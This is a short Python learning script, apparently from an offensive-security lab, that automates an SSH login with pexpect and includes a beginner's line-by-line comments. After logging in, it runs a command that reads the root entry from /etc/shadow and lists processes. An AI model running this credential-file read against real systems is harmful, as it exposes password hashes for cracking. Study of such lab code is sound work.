#!/usr/bin/python3


import pexpect



PROMPT = ['# ', '>>> ', '> ', '\$ ', '~ ']


# send_command function tells the send_command function in main()

def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)
	print (child.before)


# Below is the 'Connect' function. This is the function that will actually connect to the host via ssh

def connect(user, host, password):
#	Takes an input of defined variables. In this case its User, Host and Password
	ssh_newkey = 'Are you sure you want to continue connecting'
#	You will notice that when trying to connect to meta2 it will ask whether ur sure abt connecting. Must add this as an expect in the script otherwise script will break. 
	connStr = 'ssh ' + user + '@' + host
#	basically the command you would run in terminal but with values substituted
	child = pexpect.spawn(connStr)
#	(?) Runs the string determined. connStr variable in this case
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
#	What is returned from the 'child' variable. "child.expect" is what we expect the target to send back. The character "|" is called 'pipe'(?). This allows for different options within a string. 
	if ret == 0:
#	if what is returned is a 0, no connection was made
		print ('(-) Error Connecting')
		return
#		Exit program
	if ret == 1:
#	if what was returned is a 1, connection was successful. 
		child.sendline('yes')
#		the string 'yes' is then sent to continue the connection. 
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
#		We want to expect the 'Password: ' prompt to come up. 
		if ret == 0:
#		Something went wrong, no connection
			print ('(-) Error Connecting')
			return
#			Exit program
	child.sendline(password)
#	If connection was successful, we want to send the password, which is stored in the password variable below. 
	child.expect(PROMPT)
#	Expecting some sort of prompt from the ssh. DIfferent types of 'Prompts' are stored above. Also means successful login to target
	return child 
#	"return the child", Which ofc is the ssh connection. What else?
	print ('[+] Connected')




def main():
	host = input('Enter Ip Here: ')
	user = input('Enter User to Login as: ')
	password = input('Enter Password to Use: ')
	child = connect(user,host,password)
#	child is the 'shell' that we will create. it connects to the ssh port using given info. 
	send_command(child, 'cat /etc/shadow | grep root;ps')
#	sends the specified command to the shell within the shell created by 'child' function
#	using ';' within a command gives the ability to run multiple commands at once
#	the 'ps' command shows all working processes on the machine




main()